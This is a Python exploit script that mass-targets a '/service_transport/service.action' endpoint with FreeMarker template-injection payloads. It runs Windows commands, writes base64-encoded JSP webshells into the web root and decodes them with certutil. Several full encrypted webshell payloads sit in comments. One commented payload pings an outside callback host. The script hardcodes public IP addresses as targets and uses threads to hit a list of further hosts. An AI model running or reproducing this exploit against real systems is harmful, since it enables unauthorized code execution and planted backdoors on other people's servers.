import requests
from concurrent.futures import ThreadPoolExecutor
import os
import time
import urllib3
import threading
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
filename = Path(__file__).name.strip('.py')
line_break = '\n'
file_path = Path(__file__).resolve().parent
result_path = file_path/'result'/f'{filename}.txt'


def again(url):
    try:
        payload1 = {
            "command": "GetFZinfo",
            "UnitCode": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c certutil -decode ./webapps/ROOT/mike.txt ./webapps/ROOT/mike.jsp\")}"
        }
        post1 = requests.post(
            url, json=payload1, headers=headers, timeout=8, verify=False)
    except Exception as e:

        # print(e)
        pass


def exploit(ip_, index):
    try:

        url = ip_+'/service_transport/service.action'
        # print(index, url)
        # res = requests.get(url, headers=headers, timeout=8, verify=False)
        # if res.status_code != 200 or len(res.text) == 13:
        #     return
        # print(res, len(res.text))
        # # print(url)
        print(index, ip_+'/mike.jsp')
        payload = {
            "command": "GetFZinfo",
            # "UnitCode": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c ping t2o94993.eyes.sh\")}"
            "UnitCode": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c echo hello,vulning >./webapps/ROOT/jordan.txt\")}"

            # "UnitCode": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c echo PCUhCiAgICBjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXIgewogICAgICAgIFUoQ2xhc3NMb2FkZXIgYykgewogICAgICAgICAgICBzdXBlcihjKTsKICAgICAgICB9CiAgICAgICAgcHVibGljIENsYXNzIGcoYnl0ZVtdIGIpIHsKICAgICAgICAgICAgcmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGIsIDAsIGIubGVuZ3RoKTsKICAgICAgICB9CiAgICB9CiAKICAgIHB1YmxpYyBieXRlW10gYmFzZTY0RGVjb2RlKFN0cmluZyBzdHIpIHRocm93cyBFeGNlcHRpb24gewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIENsYXNzIGNsYXp6ID0gQ2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RGVjb2RlciIpOwogICAgICAgICAgICByZXR1cm4gKGJ5dGVbXSkgY2xhenouZ2V0TWV0aG9kKCJkZWNvZGVCdWZmZXIiLCBTdHJpbmcuY2xhc3MpLmludm9rZShjbGF6ei5uZXdJbnN0YW5jZSgpLCBzdHIpOwogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgIENsYXNzIGNsYXp6ID0gQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkJhc2U2NCIpOwogICAgICAgICAgICBPYmplY3QgZGVjb2RlciA9IGNsYXp6LmdldE1ldGhvZCgiZ2V0RGVjb2RlciIpLmludm9rZShudWxsKTsKICAgICAgICAgICAgcmV0dXJuIChieXRlW10pIGRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZSIsIFN0cmluZy5jbGFzcykuaW52b2tlKGRlY29kZXIsIHN0cik7CiAgICAgICAgfQogICAgfQolPgo8JQogICAgU3RyaW5nIGNscyA9IHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJtaWtlIik7CiAgICBpZiAoY2xzICE9IG51bGwpIHsKICAgICAgICBuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhiYXNlNjREZWNvZGUoY2xzKSkubmV3SW5zdGFuY2UoKS5lcXVhbHMocGFnZUNvbnRleHQpOwogICAgfQolPg== >./webapps/ROOT/mike.txt\")}"
            # "UnitCode": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c echo PCUhIFN0cmluZyB4Yz0iM2M2ZTBiOGE5YzE1MjI0YSI7IGNsYXNzIFggZXh0ZW5kcyBDbGFzc0xvYWRlcntwdWJsaWMgWChDbGFzc0xvYWRlciB6KXtzdXBlcih6KTt9cHVibGljIENsYXNzIFEoYnl0ZVtdIGNiKXtyZXR1cm4gc3VwZXIuZGVmaW5lQ2xhc3MoY2IsIDAsIGNiLmxlbmd0aCk7fSB9cHVibGljIGJ5dGVbXSB4KGJ5dGVbXSBzLGJvb2xlYW4gbSl7IHRyeXtqYXZheC5jcnlwdG8uQ2lwaGVyIGM9amF2YXguY3J5cHRvLkNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7Yy5pbml0KG0/MToyLG5ldyBqYXZheC5jcnlwdG8uc3BlYy5TZWNyZXRLZXlTcGVjKHhjLmdldEJ5dGVzKCksIkFFUyIpKTtyZXR1cm4gYy5kb0ZpbmFsKHMpOyB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXtyZXR1cm4gbnVsbDsgfX0KJT48JXRyeXtieXRlW10gZGF0YT1uZXcgYnl0ZVtJbnRlZ2VyLnBhcnNlSW50KHJlcXVlc3QuZ2V0SGVhZGVyKCJDb250ZW50LUxlbmd0aCIpKV07amF2YS5pby5JbnB1dFN0cmVhbSBpbnB1dFN0cmVhbT0gcmVxdWVzdC5nZXRJbnB1dFN0cmVhbSgpO2ludCBfbnVtPTA7d2hpbGUgKChfbnVtKz1pbnB1dFN0cmVhbS5yZWFkKGRhdGEsX251bSxkYXRhLmxlbmd0aCkpPGRhdGEubGVuZ3RoKTtkYXRhPXgoZGF0YSwgZmFsc2UpO2lmIChzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpPT1udWxsKXtzZXNzaW9uLnNldEF0dHJpYnV0ZSgicGF5bG9hZCIsbmV3IFgodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLlEoZGF0YSkpO31lbHNle3JlcXVlc3Quc2V0QXR0cmlidXRlKCJwYXJhbWV0ZXJzIiwgZGF0YSk7T2JqZWN0IGY9KChDbGFzcylzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpKS5uZXdJbnN0YW5jZSgpO2phdmEuaW8uQnl0ZUFycmF5T3V0cHV0U3RyZWFtIGFyck91dD1uZXcgamF2YS5pby5CeXRlQXJyYXlPdXRwdXRTdHJlYW0oKTtmLmVxdWFscyhhcnJPdXQpO2YuZXF1YWxzKHBhZ2VDb250ZXh0KTtmLnRvU3RyaW5nKCk7cmVzcG9uc2UuZ2V0T3V0cHV0U3RyZWFtKCkud3JpdGUoeChhcnJPdXQudG9CeXRlQXJyYXkoKSwgdHJ1ZSkpO30gfWNhdGNoIChFeGNlcHRpb24gZSl7fQolPg== >./webapps/ROOT/mikejordan.txt\")}"
            # "UnitCode": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c echo PCUhIFN0cmluZyB4Yz0iM2M2ZTBiOGE5YzE1MjI0YSI7IFN0cmluZyBwYXNzPSJwYXNzIjsgU3RyaW5nIG1kNT1tZDUocGFzcyt4Yyk7IGNsYXNzIFggZXh0ZW5kcyBDbGFzc0xvYWRlcntwdWJsaWMgWChDbGFzc0xvYWRlciB6KXtzdXBlcih6KTt9cHVibGljIENsYXNzIFEoYnl0ZVtdIGNiKXtyZXR1cm4gc3VwZXIuZGVmaW5lQ2xhc3MoY2IsIDAsIGNiLmxlbmd0aCk7fSB9cHVibGljIGJ5dGVbXSB4KGJ5dGVbXSBzLGJvb2xlYW4gbSl7IHRyeXtqYXZheC5jcnlwdG8uQ2lwaGVyIGM9amF2YXguY3J5cHRvLkNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7Yy5pbml0KG0/MToyLG5ldyBqYXZheC5jcnlwdG8uc3BlYy5TZWNyZXRLZXlTcGVjKHhjLmdldEJ5dGVzKCksIkFFUyIpKTtyZXR1cm4gYy5kb0ZpbmFsKHMpOyB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXtyZXR1cm4gbnVsbDsgfX0gcHVibGljIHN0YXRpYyBTdHJpbmcgbWQ1KFN0cmluZyBzKSB7U3RyaW5nIHJldCA9IG51bGw7dHJ5IHtqYXZhLnNlY3VyaXR5Lk1lc3NhZ2VEaWdlc3QgbTttID0gamF2YS5zZWN1cml0eS5NZXNzYWdlRGlnZXN0LmdldEluc3RhbmNlKCJNRDUiKTttLnVwZGF0ZShzLmdldEJ5dGVzKCksIDAsIHMubGVuZ3RoKCkpO3JldCA9IG5ldyBqYXZhLm1hdGguQmlnSW50ZWdlcigxLCBtLmRpZ2VzdCgpKS50b1N0cmluZygxNikudG9VcHBlckNhc2UoKTt9IGNhdGNoIChFeGNlcHRpb24gZSkge31yZXR1cm4gcmV0OyB9IHB1YmxpYyBzdGF0aWMgU3RyaW5nIGJhc2U2NEVuY29kZShieXRlW10gYnMpIHRocm93cyBFeGNlcHRpb24ge0NsYXNzIGJhc2U2NDtTdHJpbmcgdmFsdWUgPSBudWxsO3RyeSB7YmFzZTY0PUNsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKTtPYmplY3QgRW5jb2RlciA9IGJhc2U2NC5nZXRNZXRob2QoImdldEVuY29kZXIiLCBudWxsKS5pbnZva2UoYmFzZTY0LCBudWxsKTt2YWx1ZSA9IChTdHJpbmcpRW5jb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZW5jb2RlVG9TdHJpbmciLCBuZXcgQ2xhc3NbXSB7IGJ5dGVbXS5jbGFzcyB9KS5pbnZva2UoRW5jb2RlciwgbmV3IE9iamVjdFtdIHsgYnMgfSk7fSBjYXRjaCAoRXhjZXB0aW9uIGUpIHt0cnkgeyBiYXNlNjQ9Q2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RW5jb2RlciIpOyBPYmplY3QgRW5jb2RlciA9IGJhc2U2NC5uZXdJbnN0YW5jZSgpOyB2YWx1ZSA9IChTdHJpbmcpRW5jb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZW5jb2RlIiwgbmV3IENsYXNzW10geyBieXRlW10uY2xhc3MgfSkuaW52b2tlKEVuY29kZXIsIG5ldyBPYmplY3RbXSB7IGJzIH0pO30gY2F0Y2ggKEV4Y2VwdGlvbiBlMikge319cmV0dXJuIHZhbHVlOyB9IHB1YmxpYyBzdGF0aWMgYnl0ZVtdIGJhc2U2NERlY29kZShTdHJpbmcgYnMpIHRocm93cyBFeGNlcHRpb24ge0NsYXNzIGJhc2U2NDtieXRlW10gdmFsdWUgPSBudWxsO3RyeSB7YmFzZTY0PUNsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKTtPYmplY3QgZGVjb2RlciA9IGJhc2U2NC5nZXRNZXRob2QoImdldERlY29kZXIiLCBudWxsKS5pbnZva2UoYmFzZTY0LCBudWxsKTt2YWx1ZSA9IChieXRlW10pZGVjb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZGVjb2RlIiwgbmV3IENsYXNzW10geyBTdHJpbmcuY2xhc3MgfSkuaW52b2tlKGRlY29kZXIsIG5ldyBPYmplY3RbXSB7IGJzIH0pO30gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7dHJ5IHsgYmFzZTY0PUNsYXNzLmZvck5hbWUoInN1bi5taXNjLkJBU0U2NERlY29kZXIiKTsgT2JqZWN0IGRlY29kZXIgPSBiYXNlNjQubmV3SW5zdGFuY2UoKTsgdmFsdWUgPSAoYnl0ZVtdKWRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZUJ1ZmZlciIsIG5ldyBDbGFzc1tdIHsgU3RyaW5nLmNsYXNzIH0pLmludm9rZShkZWNvZGVyLCBuZXcgT2JqZWN0W10geyBicyB9KTt9IGNhdGNoIChFeGNlcHRpb24gZTIpIHt9fXJldHVybiB2YWx1ZTsgfSU+PCV0cnl7Ynl0ZVtdIGRhdGE9YmFzZTY0RGVjb2RlKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKHBhc3MpKTtkYXRhPXgoZGF0YSwgZmFsc2UpO2lmIChzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpPT1udWxsKXtzZXNzaW9uLnNldEF0dHJpYnV0ZSgicGF5bG9hZCIsbmV3IFgodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLlEoZGF0YSkpO31lbHNle3JlcXVlc3Quc2V0QXR0cmlidXRlKCJwYXJhbWV0ZXJzIixkYXRhKTtqYXZhLmlvLkJ5dGVBcnJheU91dHB1dFN0cmVhbSBhcnJPdXQ9bmV3IGphdmEuaW8uQnl0ZUFycmF5T3V0cHV0U3RyZWFtKCk7T2JqZWN0IGY9KChDbGFzcylzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpKS5uZXdJbnN0YW5jZSgpO2YuZXF1YWxzKGFyck91dCk7Zi5lcXVhbHMocGFnZUNvbnRleHQpO3Jlc3BvbnNlLmdldFdyaXRlcigpLndyaXRlKG1kNS5zdWJzdHJpbmcoMCwxNikpO2YudG9TdHJpbmcoKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShiYXNlNjRFbmNvZGUoeChhcnJPdXQudG9CeXRlQXJyYXkoKSwgdHJ1ZSkpKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShtZDUuc3Vic3RyaW5nKDE2KSk7fSB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXt9CiU+ >./webapps/ROOT/mikejordan.txt\")}"
        }
        payload1 = {
            "command": "GetFZinfo",
            "UnitCode": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c certutil -decode ./webapps/ROOT/mike.txt ./webapps/ROOT/mike.jsp\")}"
        }
        post1 = requests.post(
            url, json=payload, headers=headers, timeout=8, verify=False)
        time.sleep(2)
        post1 = requests.post(
            url, json=payload1, headers=headers, timeout=8, verify=False)
        # get = requests.get(ip_+'/mike.jsp', headers=headers,
        #    timeout=8, verify=False)
        # print(get)
        # print(post1, len(post1.text))
        # print(post1.text)
        # with result_path.open('a+') as file:
        # file.write(ip_+line_break)

    except Exception as e:
        again(url)
        # print(e)
        pass


url = 'http://221.7.223.19:8086'
exploit(url, 1)
# 7 http: // 58.57.108.40: 8089

threads = []
# with open(r'D:\Downloads\tmp\school.txt', 'r') as file:
with result_path.open('r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 40
        end = start+100

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            # print(index, ip)
            # exploit(ip, index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 25
# print(urls)

test = 'tm'


if test == 't':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test == 'm':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()


# http://113.195.129.16:5357/    可Host碰撞
